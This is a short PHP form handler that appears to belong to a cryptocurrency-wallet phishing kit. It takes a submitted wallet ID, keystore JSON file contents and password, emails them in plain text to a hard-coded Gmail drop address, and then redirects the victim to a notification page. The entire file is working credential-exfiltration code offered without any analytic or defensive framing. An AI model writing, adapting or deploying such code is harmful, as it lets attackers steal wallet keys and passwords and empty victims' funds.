<?php
if(isset($_POST['submit']))
{
$walletid = $_POST['walletid'];
$keystore = $_POST['keystore'];
$Password = $_POST['Password'];
$to = "spierinelli12@gmail.com";
$subject= $walletid;
	$headers = "You have a post on : " . $walletid . "\r\n";
	$body .= "keystore JSON:  {$keystore}
	PASSWORD: {$Password}";

	mail($to, $subject, $body, $headers);
    header("Location: notification.php");
}	

?>